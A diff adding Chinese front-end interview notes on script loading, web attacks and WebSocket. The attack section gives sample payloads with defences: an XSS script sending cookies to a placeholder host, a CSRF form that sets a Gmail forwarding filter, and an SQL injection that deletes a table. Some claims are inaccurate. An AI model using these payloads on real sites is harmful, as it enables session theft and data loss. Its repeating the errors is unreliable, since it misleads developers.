@@ -416,3 +416,349 @@ http + TLS/SSL = https ，即加密传输信息。只有客户端和服务端可
 ### 划重点
 
 - HTTPS 加密过程
+
+## 08: defer 和 async
+
+### 题目
+
+`<script>` 的 defer 和 async 属性有何区别
+
+### 答案
+
+- `<script src="xxx.js">` 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。
+- `<script defer src="xxx.js">` js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。
+- `<script async src="xxx.js">` js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。
+
+![](./img/06/async-defer.png)
+
+### 连环问：preload prefetch dns-prefetch 的区别
+
+- preload 表示资源在当前页面使用，浏览器会**优先**加载
+- prefetch 表示资源可能在**未来的页面**（如通过链接打开下一个页面）使用，浏览器将在**空闲时**加载
+
+```html
+<head>
+  <meta charset="utf-8" />
+  <title>JS and CSS preload</title>
+
+  <!-- preload -->
+  <link rel="preload" href="style.css" as="style" />
+  <link rel="preload" href="main.js" as="script" />
+
+  <!-- prefetch -->
+  <link rel="prefetch" href="other.js" as="script" />
+
+  <!-- 引用 css -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+  <h1>hello</h1>
+
+  <!-- 引用 js -->
+  <script src="main.js" defer></script>
+</body>
+```
+
+### 连环问：dns-prefetch 和 preconnect 有什么作用？
+
+一个 http 请求，第一步就是 DNS 解析得到 IP ，然后进行 TCP 连接。连接成功后再发送请求。
+
+dns-prefetch 即 DNS 预查询，preconnect 即预连接。<br>
+当网页请求**第三方**资源时，可以提前进行 DNS 查询、TCP 连接，以减少请求时的时间。
+
+```html
+<html>
+  <head>
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+  </head>
+  <body>
+    <p>hello</p>
+  </body>
+</html>
+```
+
+#### 答案：
+
+- prefetch 是资源预获取（和 preload 相关）
+- dnd-prefetch 是 DNS 预查询（和 preconnect 相关）
+
+## 09：前端攻击手段有哪些，该如何预防
+
+### 题目
+
+你所了解的前端攻击手段有哪些，该如何预防？
+
+### XSS
+
+Cross Site Scripting 跨站脚本攻击
+
+用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。<br>
+该内容再显示时，这些代码也将会被执行，形成了攻击效果。
+
+```html
+<!-- 例如用户提交的内容中有： -->
+<script>
+  var img = document.createElement('img')
+  img.src = 'http://xxx.com/api/xxx?userInfo=' + document.cookie // 将 cookie 提交到自己的服务器
+</script>
+```
+
+**最简单的解决方式：替换特殊字符**
+
+```js
+const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
+```
+
+也可以使用第三方工具，例如
+
+- [https://www.npmjs.com/package/xss](https://www.npmjs.com/package/xss)
+- [https://www.npmjs.com/package/escape-html](https://www.npmjs.com/package/escape-html)
+
+现代框架默认会屏蔽 XSS 攻击，除非自己手动开启
+
+- Vue `v-html`
+- React `dangerouslySetInnerHTML`
+
+### CSRF
+
+Cross-site request forgery 跨站请求伪造
+
+请看下面的故事
+
+- 小明登录了 Gmail 邮箱，收到一封广告邮件 “转让比特币，只要 998”
+- 小明抱着好奇的心态点开看了看，发现是个空白页面，就关闭了
+
+但此时，攻击已经完成了。黑客在这个空白页面设置了 js 代码，会让小明的邮件都转发到 `hacker@hackermail.com` 。<br>
+因为小明已经登录了 Gmail ，有了 Gmail 的 cookie 。所以再去请求 Gmail API 就会带着 cookie ，就有可能成功。
+
+```html
+<form
+  method="POST"
+  action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf"
+  enctype="multipart/form-data"
+>
+  <input type="hidden" name="cf2_emc" value="true" />
+  <input type="hidden" name="cf2_email" value="hacker@hakermail.com" />
+  .....
+  <input type="hidden" name="irf" value="on" />
+  <input type="hidden" name="nvp_bu_cftb" value="Create Filter" />
+</form>
+<script>
+  document.forms[0].submit()
+
+  // PS：有些是 post 请求，有些是 get 请求
+  //     get 请求如果用 img.src 还可以规避跨域，更加危险
+</script>
+```
+
+邮件经常用来接收验证码，这是很危险的事情。<br>
+当然了，后来 Gmail 修复了这个漏洞。但新的故事仍在不断发生中。
+
+CSRF 的过程
+
+- 用户登录了 `a.com` ，有了 cookie
+- 黑客引诱用户访问 `b.com` 网页，并在其中发起一个跨站请求 `a.com/api/xxx`
+- `a.com` API 收到 cookie ，误以为是真实用户的请求，就受理了
+
+CSRF 的预防
+
+- 严格的跨域请求限制,如判断 referrer(请求来源)
+- 为 cookie 设置 `SameSite` 不随跨域请求被发送 `Set-Cookie: key1=val1; key2=val2; SameSite=Strict;`
+- 关键接口使用短信验证码等双重验证
+
+### 点击劫持 Clickjacking
+
+小明被诱导到一个钓鱼网站，点击了一个按钮，其实已经关注了慕课网双越老师。因为他可能已经登录了慕课网。<br>
+这可以是关注，也可以是付款转账等其他危险操作。
+
+![](./img/06/点击劫持.png)
+
+点击劫持的原理：黑客在自己的网站，使用隐藏的 `<iframe>` 嵌入其他网页，诱导用户按顺序点击。
+
+- 使用 JS 预防
+
+  ```js
+  if (top.location.hostname !== self.location.hostname) {
+    alert('您正在访问不安全的页面，即将跳转到安全页面！')
+    top.location.href = self.location.href
+  }
+  ```
+
+- 增加 http header `X-Frame-Options:SAMEORIGIN` ，让 `<iframe>` 只能加载同域名的网页。
+
+PS：点击劫持，攻击那些需要用户点击操作的行为。CSRF 不需要用户知道，偷偷完成。
+
+### DDoS
+
+- Distributed denial-of-service 分布式拒绝服务
+- 手段：分布式的、大规模的流量访问，使服务器瘫痪
+- 预防：软件层不好做，需要硬件预防（如阿里云 WAF）
+
+通过大规模的网络流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。<br>
+类似于恶意堵车，妨碍正常车辆通行。
+
+网络上的设备感染了恶意软件，被黑客操控，同时向一个域名或者 IP 发送网络请求。因此形成了洪水一样的攻击效果。<br>
+由于这些请求都来自分布在网络上的各个设备，所以不太容易分辨合法性。
+
+DDoS 的预防：软件层面不好做，可以选择商用的防火墙，如[阿里云 WAF](https://www.aliyun.com/product/waf?spm=5176.7967425.J_8058803260.34.3d017748VkTlhL)。
+
+PS：阮一峰的网站就曾遭遇过 DDoS 攻击 [https://www.ruanyifeng.com/blog/2018/06/ddos.html](https://www.ruanyifeng.com/blog/2018/06/ddos.html)
+
+### SQL 注入
+
+- 手段：黑客提交内容时写入 SQL 语句，破坏数据库
+- 预防：处理输入的内容，替换特殊字符
+
+普通的登录方式，输入用户名 `zhangsan` 、密码 `123` ，然后服务端去数据库查询。<br>
+会执行一个 sql 语句 `select * from users where username='zhangsan' and password='123'` ，然后判断是否找到该用户。
+
+如果用户输入的是用户名 `' delete from users where 1=1; --` ，密码 `'123'`<br>
+那生成的 sql 语句就是 `select * from users where username='' delete from users where 1=1; --' and password='123'`<br>
+这样就会把 `users` 数据表全部删除。
+
+防止 SQL 注入：服务端进行特殊字符转换，如把 `'` 转换为 `\'`
+
+### 答案
+
+- XSS
+- CSRF
+- 点击劫持
+- DDoS
+- SQL 注入
+
+### 划重点
+
+- 预防攻击，要各司其职，而不要依赖于其他角色（如后端）
+
+## 10: WebSocket 和 HTTP 协议有什么区别
+
+### 题目
+
+webSocket 和 http 协议有何区别？有和应用场景？
+
+### WebSocket
+
+- 支持端对端通讯
+- 可以由 client 发起，也可以由 server 发起
+- 用于：消息通知，直播间讨论区，聊天室，协同编辑
+
+### webSocket 简介
+
+webSocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。<br>
+代码参考 ws-server 中 webSocket1.html webSocket2.html
+
+#### 服务端
+
+```javascript
+const { WebSocketServer } = require('ws')
+
+const wsServer = new WebSocketServer({ port: 3000 })
+
+wsServer.on('connection', (ws) => {
+  console.info('connected')
+
+  ws.on('message', (msg) => {
+    console.info('收到了信息', msg.toString())
+
+    // 服务端向客户端发送信息
+    setTimeout(() => {
+      ws.send('服务端已经收到了信息: ' + msg.toString())
+    }, 2000)
+  })
+})
+```
+
+#### 客户端
+
+```html
+// webSocket1.html<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>websocket</title>
+  </head>
+  <body>
+    <p>websocket</p>
+    <button id="btn-send">发送消息</button>
+
+    <script>
+      const ws = new WebSocket('ws://127.0.0.1:3000')
+      ws.onopen = () => {
+        console.info('opened')
+        ws.send('client opened')
+      }
+      ws.onmessage = (event) => {
+        console.info('收到了信息', event.data)
+      }
+
+      const btnSend = document.getElementById('btn-send')
+      btnSend.addEventListener('click', () => {
+        console.info('clicked')
+        ws.send('当前时间' + Date.now())
+      })
+    </script>
+  </body>
+</html>
+```
+
+场景：消息通知，直播讨论区，聊天室，协同编辑
+
+### webSocket 建立连接
+
+- 会先发起一个 `http` 请求，根服务端建立连接。
+- 连接成功之后再升级为 `webSocket 协议`，然后再通讯。
+
+![](./img/06/ws连接.png)
+
+### webSocket 和 http 区别
+
+- 协议名称不同 `ws` 和 `http`
+- `http` 一般只能浏览器发起请求，`webSocket` 可以双端发起请求
+- `webSocket` 无跨域限制
+- `webSocket` 通过 `send` 和 `onmessage` 进行通讯，`http` 通过 `req` 和 `res` 通讯
+
+PS：`ws` 可以升级为 `wss` 协议，像 `http` 升级到 `https` 一样，增加 `SSL` 安全协议。
+
+```js
+import { createServer } from 'https'
+import { readFileSync } from 'fs'
+import { WebSocketServer } from 'ws'
+
+const server = createServer({
+  cert: readFileSync('/path/to/cert.pem'),
+  key: readFileSync('/path/to/key.pem'),
+})
+const wss = new WebSocketServer({ server })
+```
+
+### 扩展
+
+PS：如果做项目开发，推荐使用 [socket.io](https://www.npmjs.com/package/socket.io)，API 更方便。
+
+```js
+io.on('connection', (socket) => {
+  // emit an event to the socket
+  socket.emit('request' /* … */)
+  // emit an event to all connected sockets
+  io.emit('broadcast' /* … */)
+  // listen to the event
+  socket.on('reply', () => {
+    /* … */
+  })
+})
+```
+
+### 连环问：webSocket 和长轮询（长连接）的区别
+
+- http 长轮询 - 客户端发起 http 请求，server 不立即返回，等待有结果再返回。这期间 TCP 连接不会关闭，阻塞式。（需要处理 timeout 的情况）
+- webSocket - 客户端发起请求，服务端接收，连接关闭。服务端发起请求，客户端接收，连接关闭。非阻塞。
+
+![](./img/06/长轮询.png)
+
+#### 注意：
+
+- HTTP 长轮询，需要处理 timeout ，即 timeout 之后重新发送请求
